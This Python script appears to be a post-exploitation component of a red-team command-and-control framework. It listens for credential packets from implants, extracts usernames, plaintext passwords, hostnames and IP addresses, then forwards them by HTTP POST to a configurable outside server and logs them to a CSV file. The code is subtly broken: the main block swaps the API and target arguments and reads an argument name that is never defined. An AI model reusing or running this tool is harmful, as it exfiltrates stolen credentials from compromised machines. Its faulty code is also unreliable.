#!/usr/bin/python3
# Copyright (C) 2020 - 2023 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from io import BytesIO
from json import loads
from requests import post
from base64 import b64decode
from include.util import nes
from sys import stderr, exit
from include.cirrus import Api
from traceback import format_exc
from include.sentinel import Reader
from argparse import ArgumentParser
from os.path import expanduser, expandvars, exists

IGNORE_USER = ""
IGNORE_PASSWORD = ""


class Proxy(Api):
    __slots__ = ("_id", "_file", "_target")

    def __init__(self, target, id, url, password=None, file=None):
        Api.__init__(self, url, password)
        self._id = id
        self._file = None
        self._target = target
        if nes(file):
            self._file = expanduser(expandvars(file))

    def start(self):
        self.start_events(self._on_event)

    def _read_packet(self, n):
        try:
            p = self.packet(n)
        except ValueError as err:
            return print(f'Unable to retrieve Packet "{n}": {err}!', file=stderr)
        try:
            d = b64decode(p["data"])
        except Exception as err:
            return print(f'Unable to decode Packet "{n}": {err}!', file=stderr)
        t = p["time"]
        del p
        if d is None or len(d) == 0:
            return print(f'Packet "{n}" was empty, skipping!', file=stderr)
        try:
            r = Reader(BytesIO(d))
            u, p, w = r.read_str(), r.read_str(), ""
            r.r.read(41)  # Skip ID, PID, PPID
            r.read_str()  # user
            r.read_str()  # version
            h = r.read_str()  # hostname
            r.read_uint8()  # Elevated
            r.read_uint32()  # Capabilities
            i = r.read_uint8()  # Network Len
            for _ in range(0, i):
                r.read_str()  # Name
                r.read_uint64()  # Mac Address
                z = r.read_uint8()  # IP Address Len
                for _ in range(0, z):
                    k, j = r.read_uint64(), r.read_uint64()
                    if k > 0 or j == 0 or ((j >> 24) & 0xFF) == 127:
                        continue  # Skip IPv6 for now
                    w = f"{(j >> 24) & 0xFF}.{(j >> 16) & 0xFF}.{(j >> 8) & 0xFF}.{j & 0xFF}"
                    del k, j
                del z
            del i
        except Exception as err:
            return print(f'Unable to read Packet "{n}": {err}!', file=stderr)
        if u[-1] == "$" or u.startswith("UMFD-") or u.startswith("DWM-"):
            return
        if nes(IGNORE_USER) and u.startswith(IGNORE_USER) and p == IGNORE_PASSWORD:
            return print(f'Skiping well know combo "{u}" / "{p}".', file=stderr)
        try:
            if nes(self._target):
                post(
                    self._target,
                    json={"username": u, "password": p, "hostname": h, "ipaddress": w},
                )
        except Exception as err:
            print(f'Unable to proxy Packet "{n}": {err}!', file=stderr)
        if nes(self._file):
            try:
                e = exists(self._file)
                with open(self._file, "a") as f:
                    if not e:
                        f.write("Time,IP,Hostname,User,Password\r\n")
                    f.write(f'{t},"{w}","{h}","{u}","{p}"\r\n')
            except Exception as err:
                print(f'Unable to write to file "{self._file}": {err}!', file=stderr)
        del u, p, h, t, w

    def _on_event(self, _, msg):
        try:
            v = loads(msg)
        except (ValueError, UnicodeDecodeError):
            return
        if not isinstance(v, dict) or len(v) == 0:
            return
        if "name" not in v or "action" not in v:
            return
        n = v["name"]
        a = v["action"]
        d = v.get("value")
        del v
        if not nes(n) or not nes(a) or not isinstance(d, int):
            del n, a, d
            return
        if a != "packet_new" or d != self._id:
            del n, a, d
            return
        del a, d
        self._read_packet(n)
        del n


if __name__ == "__main__":
    a = ArgumentParser(prog="Password Proxy", description="Cirrus Passwords Proxy")
    a.add_argument(
        "-a", "--api", dest="api", type=str, required=True, help="Cirrus API Target"
    )
    a.add_argument(
        "-p", "--password", dest="pass", type=str, help="Cirrus API Password"
    )
    a.add_argument(
        "-i", "--id", dest="id", type=int, default=77, help="Password Packet ID"
    )
    a.add_argument("-f", "--file", dest="file", type=str, help="Passwords CSV Output")
    a.add_argument(
        "-t", "--target", dest="target", type=str, help="Password Proxy API Target"
    )
    r = a.parse_args()
    del a
    try:
        s = Proxy(r.api, r.id, r.target, r.password, r.file)
    except Exception as err:
        print(f"Error: {err}\n{format_exc(3)}", file=stderr)
        exit(1)
    try:
        s.start()
    except KeyboardInterrupt:
        s.close()
    except Exception as err:
        print(f"Error: {err}\n{format_exc(3)}", file=stderr)
        exit(1)
    del s, r
